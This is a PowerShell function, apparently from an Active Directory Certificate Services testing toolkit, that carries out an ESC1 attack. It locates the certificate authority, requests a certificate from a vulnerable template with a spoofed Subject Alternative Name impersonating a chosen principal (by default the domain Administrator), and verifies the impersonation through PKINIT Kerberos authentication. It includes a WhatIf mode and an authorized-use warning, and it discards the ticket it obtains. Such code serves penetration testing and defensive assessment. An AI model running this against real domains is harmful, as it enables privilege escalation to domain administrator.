function Invoke-ESC1Attack {
    <#
        .SYNOPSIS
        Performs an ESC1 attack by requesting a certificate with a spoofed principal SAN,
        then verifies it via PKINIT - pure PowerShell, no Certify.exe or Rubeus.exe.

        .DESCRIPTION
        Executes an ESC1 (SAN Spoofing) attack against a vulnerable certificate template.
        Requests a certificate whose Subject Alternative Name impersonates a target
        security principal using Request-ESC1Certificate (inbox .NET CertificateRequest +
        CertificateAuthority.Request COM). After issuance, verifies the certificate
        authenticates as the target via the vendored PSPkinit Invoke-PkinitAuthentication
        (RFC 4556 MODP DH). The TGT is verified and then zeroed/discarded - never
        injected, written to disk, or applied to the session.

        If no target principal is specified, defaults to the domain Administrator (RID 500).

        ESC1 attacks exploit templates that:
        1. Allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, name flag 0x1)
        2. Have Client Authentication EKU enabled
        3. Allow low-privileged users to enroll
        4. Do not require manager approval or authorized signatures

        .PARAMETER TemplateObject
        A DirectoryEntry object representing a certificate template (pKICertificateTemplate)
        vulnerable to ESC1. Should allow SAN specification and have Client Auth EKU.

        .PARAMETER CertificateAuthority
        The CA configuration string "CA-SERVER\CA-NAME". Auto-discovered if omitted.

        .PARAMETER TargetPrincipal
        DirectoryEntry of the security principal to impersonate. Defaults to domain
        Administrator (RID 500). Can be resolved with Resolve-Principal.

        .PARAMETER WhatIf
        Shows what attack would be performed without contacting the CA or KDC.

        .INPUTS
        System.DirectoryServices.DirectoryEntry (certificate template).

        .OUTPUTS
        PSCustomObject with Success, TemplateName, TargetPrincipal, TargetSID, SanPresent,
        Certificate (thumbprint), PkinitVerified, Principal, Realm, TgtEndTime, Error.

        .EXAMPLE
        $VulnTemplate = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'VulnTemplate' }
        Invoke-ESC1Attack -TemplateObject $VulnTemplate

        .EXAMPLE
        $TargetUser = Resolve-Principal -Identity "Administrator"
        Invoke-ESC1Attack -TemplateObject $Template -TargetPrincipal $TargetUser

        .EXAMPLE
        $ESC4Issue | ConvertTo-ESC1 -PassThru | Invoke-ESC1Attack

        .NOTES
        WARNING: This performs a real certificate enrollment + PKINIT authentication.
        Only use in authorized test environments. The KDC logs the authentication.
        Issued certificates are logged on the CA (event 4886/4887) and are revocable.

        No external tools required. Enrollment and PKINIT are implemented in-process:
        - Request-ESC1Certificate  (replaces Certify.exe)
        - Invoke-PkinitAuthentication (vendored PSPkinit, replaces Rubeus.exe)

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [System.DirectoryServices.DirectoryEntry]$TemplateObject,

        [Parameter()]
        [string]$CertificateAuthority,

        [Parameter()]
        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
    )

    #requires -Version 5.1

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."

        # Load vendored PSPkinit (idempotent; safe to re-dot-source)
        $pspk = Join-Path $PSScriptRoot 'PSPkinit'
        if (Test-Path $pspk) {
            foreach ($f in 'Asn1.ps1','KerberosCrypto.ps1','PkinitMessages.ps1','PkinitModPow.ps1','Pkinit.ps1','CertEnroll.ps1','Invoke-PkinitAuthentication.ps1') {
                $p = Join-Path $pspk $f
                if (Test-Path $p) { . $p }
            }
        }
        # ESCalator enrollment helpers
        foreach ($f in 'ConvertTo-Pkcs8PrivateKey.ps1','ConvertTo-NtdsSidExtension.ps1','Request-ESC1Certificate.ps1') {
            $p = Join-Path $PSScriptRoot $f
            if (Test-Path $p) { . $p }
        }

        # Domain info for default target + realm/KDC derivation
        $domainSid = $null
        $netbiosDomain = $env:USERDOMAIN
        $domainFqdn = $null
        try {
            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
            $defaultNC = $rootDSE.Properties["defaultNamingContext"].Value
            $domainFqdn = ($defaultNC -replace 'DC=','' -replace ',','.')
            $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
            if ($domainEntry.Properties["objectSid"].Value) {
                $sidObj = New-Object System.Security.Principal.SecurityIdentifier($domainEntry.Properties["objectSid"].Value, 0)
                $domainSid = $sidObj.Value
            }
            Write-Verbose "Domain FQDN: $domainFqdn, NetBIOS: $netbiosDomain, Domain SID: $domainSid"
        } catch {
            Write-Warning "Could not retrieve domain information: $($_.Exception.Message)"
        }
    }

    process {
        $templateName = $TemplateObject.Properties['name'].Value

        $fail = {
            param($msg)
            Write-Error $msg
            return [PSCustomObject]@{
                Success = $false; TemplateName = $templateName; TargetPrincipal = $null
                TargetSID = $null; SanPresent = $false; Certificate = $null
                PkinitVerified = $false; Principal = $null; Realm = $null; TgtEndTime = $null; Error = $msg
            }
        }

        if ($TemplateObject.SchemaClassName -ne 'pKICertificateTemplate') {
            return & $fail "Input object is not a certificate template. SchemaClassName: $($TemplateObject.SchemaClassName)"
        }

        # Validate ESC1 vulnerability signals
        $nameFlags = [int]$TemplateObject.Properties['msPKI-Certificate-Name-Flag'].Value
        $ekus = @($TemplateObject.Properties['pKIExtendedKeyUsage'].Value)
        $sanEnabled = ($nameFlags -band 0x1) -eq 0x1
        $clientAuthEnabled = $ekus -contains "1.3.6.1.5.5.7.3.2"
        if (-not $sanEnabled) { Write-Warning "Template '$templateName' does not allow SAN specification (ENROLLEE_SUPPLIES_SUBJECT not set)" }
        if (-not $clientAuthEnabled) { Write-Warning "Template '$templateName' does not have Client Authentication EKU" }

        # Resolve target principal
        $targetSID = $null; $targetName = $null; $targetUPN = $null
        if ($TargetPrincipal) {
            try {
                if ($TargetPrincipal.Properties['objectSid'].Value) {
                    $targetSID = (New-Object System.Security.Principal.SecurityIdentifier($TargetPrincipal.Properties['objectSid'].Value, 0)).Value
                    $targetName = $TargetPrincipal.Properties['sAMAccountName'].Value
                    $targetUPN = $TargetPrincipal.Properties['userPrincipalName'].Value
                    Write-Verbose "Target principal: $targetName (SID: $targetSID, UPN: $targetUPN)"
                } else { throw "Target principal has no valid SID" }
            } catch {
                return & $fail "Failed to extract SID from target principal: $($_.Exception.Message)"
            }
        } else {
            if ($domainSid) {
                $targetSID = "$domainSid-500"
                $targetName = "Administrator"
                Write-Verbose "Defaulting to Administrator (RID 500): $targetSID"
            } else {
                return & $fail "Could not determine target principal (no domain SID)"
            }
        }

        # Build UPN for SAN
        $upnValue = if ($targetUPN) { $targetUPN } else { "$targetName@$domainFqdn" }
        Write-Verbose "SAN UPN: $upnValue"

        # Auto-discover CA
        if (-not $CertificateAuthority) {
            try {
                $adcsObjects = Get-AdcsObjects
                $caObjects = $adcsObjects | Where-Object { $_.SchemaClassName -eq 'pKIEnrollmentService' }
                if ($caObjects) {
                    $caFullName = Get-CAFullName -CAObjects $caObjects
                    $CertificateAuthority = if ($caFullName -is [string]) { $caFullName } else { $caFullName[0] }
                    Write-Verbose "Discovered CA: $CertificateAuthority"
                }
            } catch {
                Write-Verbose "CA auto-discovery failed: $($_.Exception.Message)"
            }
            if (-not $CertificateAuthority) {
                return & $fail "Could not auto-discover Certificate Authority"
            }
        }

        # Derive realm + KDC hostname
        $realm = $domainFqdn.ToUpperInvariant()
        $kdc = $null
        try {
            $kdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
        } catch {
            $kdc = ($CertificateAuthority -split '\\')[0]  # fall back to CA host
        }
        Write-Verbose "Realm: $realm, KDC: $kdc"

        if (-not $PSCmdlet.ShouldProcess("Template: $templateName", "ESC1 attack (request cert with spoofed SAN + PKINIT verify)")) {
            Write-Host "What if: Would request certificate from '$CertificateAuthority' template '$templateName' with SAN UPN '$upnValue' (SID $targetSID)" -ForegroundColor Yellow
            Write-Host "What if: Would verify the issued cert authenticates as $upnValue via PKINIT against $kdc" -ForegroundColor Yellow
            return [PSCustomObject]@{
                Success = $true; TemplateName = $templateName; TargetPrincipal = $targetName
                TargetSID = $targetSID; SanPresent = $null; Certificate = $null
                PkinitVerified = $null; Principal = $null; Realm = $realm; TgtEndTime = $null; Error = 'WhatIf'
            }
        }

        Write-Warning "Executing ESC1 attack against template '$templateName' (SAN: $upnValue)"

        # Step 1: request the certificate (pure PowerShell, no Certify.exe)
        $req = Request-ESC1Certificate -TemplateName $templateName -CertificateAuthority $CertificateAuthority -TargetUPN $upnValue -TargetSid $targetSID
        if (-not $req.Success) {
            return & $fail "Certificate request failed: $($req.Error)"
        }
        Write-Host "[+] Certificate issued. SAN honored: $($req.SanPresent)" -ForegroundColor Green
        if (-not $req.SanPresent) {
            Write-Warning "CA did NOT retain the requested SAN - template is not ESC1-exploitable as configured"
        }

        # Step 2: verify via PKINIT (vendored PSPkinit, no Rubeus.exe)
        $pkinitVerified = $false
        $pkPrincipal = $null
        $pkEnd = $null
        try {
            Write-Host "[i] Verifying certificate via PKINIT against $kdc..." -ForegroundColor Cyan
            $auth = Invoke-PkinitAuthentication -Certificate $req.Certificate -ClientName $upnValue -Realm $realm -KdcHostname $kdc
            $pkinitVerified = [bool]$auth.Verified
            $pkPrincipal = $auth.CName
            $pkEnd = $auth.EndTime
            Write-Host "[+] PKINIT verified: TGT issued for $($auth.CName) (valid until $($auth.EndTime)). TGT discarded, not injected." -ForegroundColor Green
        } catch {
            Write-Warning "PKINIT verification failed: $($_.Exception.Message)"
        } finally {
            # Clean up the ephemeral CNG user key created by Request-ESC1Certificate.
            # The cert is in-memory only (no store entry to remove).
            if ($req.RsaKey) {
                try {
                    $key = $req.RsaKey.Key
                    $req.RsaKey.Dispose()
                    if ($key) { $key.Delete() }
                } catch { Write-Verbose "Key cleanup: $($_.Exception.Message)" }
            }
        }

        return [PSCustomObject]@{
            Success         = ($req.Success -and $req.SanPresent)
            TemplateName    = $templateName
            TargetPrincipal = $targetName
            TargetSID       = $targetSID
            SanPresent      = $req.SanPresent
            Certificate     = $req.Certificate.Thumbprint
            PkinitVerified  = $pkinitVerified
            Principal       = $pkPrincipal
            Realm           = $realm
            TgtEndTime      = $pkEnd
            Error           = $null
        }
    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
    }
}
